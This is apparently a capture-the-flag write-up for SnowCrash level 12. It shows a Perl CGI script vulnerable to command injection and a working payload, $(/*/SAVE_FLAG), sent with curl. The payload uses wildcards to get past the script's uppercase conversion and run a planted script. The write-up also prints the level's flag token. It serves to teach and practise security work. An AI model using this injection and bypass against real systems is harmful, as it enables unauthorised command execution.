# 🔐 Level 12

> **Category:** Perl Command Injection with Case Bypass  
> **Difficulty:** ⭐⭐⭐⭐☆  
> **Key Technique:** Uppercase filter bypass using wildcards

---

## 📋 Overview

A Perl CGI script transforms input to uppercase before executing it in a shell. We bypass this by using wildcards and uppercase filenames.

---

## 🔍 Reconnaissance

### Initial Discovery

```bash
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

### Analyzing the Script

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;      # Convert to uppercase
  $xx =~ s/\s.*//;          # Remove everything after whitespace
  @output = `egrep "^$xx" /tmp/xd 2>&1`;  # Command injection!
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

---

## 💡 Vulnerability Analysis

The script has command injection in the egrep call:

```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

**The challenge:** Input is transformed to uppercase with `tr/a-z/A-Z/`

> [!WARNING]
> `$(getflag)` becomes `$(GETFLAG)` — which doesn't exist!

**The solution:**
1. Create a script with an **uppercase name**
2. Use wildcards (`*`) to avoid path case issues

---

## 🎯 Exploitation

### Creating an Uppercase Script

```bash
# Create script with uppercase name
cat > /tmp/SAVE_FLAG << 'EOF'
#!/bin/sh
getflag > /tmp/flag12
EOF

# Make it executable
level12@SnowCrash:~$ chmod +x /tmp/SAVE_FLAG
```

### Exploiting with Wildcard Bypass

```bash
# Use wildcard to avoid /tmp becoming /TMP
level12@SnowCrash:~$ curl 'localhost:4646/?x=$(/*/SAVE_FLAG)'
..

# Read the captured flag
level12@SnowCrash:~$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

> [!TIP]
> The wildcard `*` matches any directory, so `/*/SAVE_FLAG` finds `/tmp/SAVE_FLAG` even when transformed to `/*/SAVE_FLAG`.

---

## ✅ Flag

| Item | Value |
|------|-------|
| Token | `g1qKMiRpXf53AWhDaU7FEkczr` |

---

## 📚 References

- [Shell Wildcards](https://tldp.org/LDP/GNU-Linux-Tools-Summary/html/x11655.htm)
- [Perl CGI Security](https://perldoc.perl.org/perlsec)